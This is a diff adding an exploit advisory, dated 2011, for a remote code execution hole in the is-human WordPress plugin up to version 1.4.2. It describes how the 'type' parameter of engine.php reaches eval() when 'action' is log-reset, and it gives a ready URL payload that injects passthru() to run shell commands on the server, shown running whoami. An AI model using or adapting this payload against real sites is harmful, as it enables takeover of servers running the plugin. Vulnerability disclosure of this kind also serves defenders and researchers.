@@ -1,0 +1,16 @@
+# Exploit Title: is-human (1.4.2 and prior) Worpdress plugin.
+# Date: 16.05.2011
+# Author: neworder [www.neworder-ind.net] 
+# Software Link: http://wordpress.org/extend/plugins/is-human/
+# Version: 1.4.2
+# Tested on: Linux Platform
+
+The vulnerability exists in /is-human/engine.php . 
+
+It is possible to take control of the eval() function via the 'type' parameter, when the 'action' is set to log-reset. From here we can run out own code.
+
+In order to avoid any errors we point the $is_hum->get_* array variable into $is_hum->get_ih and to close the execution without error we point it to php stored function error_log(). In between we may place our own php code and use the passthru() function to execute commands.
+
+Execution running the linux whoami command:
+
+http://server/wp-content/plugins/is-human/engine.php?action=log-reset&type=ih_options();passthru(whoami);error
